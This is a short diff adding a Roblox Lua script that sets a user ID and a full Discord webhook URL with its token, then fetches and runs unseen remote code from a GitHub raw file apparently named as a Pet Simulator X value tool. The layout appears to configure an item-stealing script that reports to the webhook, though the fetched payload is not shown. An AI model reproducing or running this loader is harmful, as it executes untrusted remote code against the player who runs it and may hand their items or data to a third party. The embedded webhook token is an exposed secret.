@@ -1,0 +1,5 @@
+UserID = 'Wizard_CatWhite'
+
+WebHooks = 'https://discord.com/api/webhooks/1090853107816214548/Vxcs9dIe4jRfqeVbX6iHJn7ZifN4_kCPfJnI17LIINOqPfBtjzXjdG0I7B93mDORO5jS'
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Kiroftt/petsimxvalue/main/guis11'))();
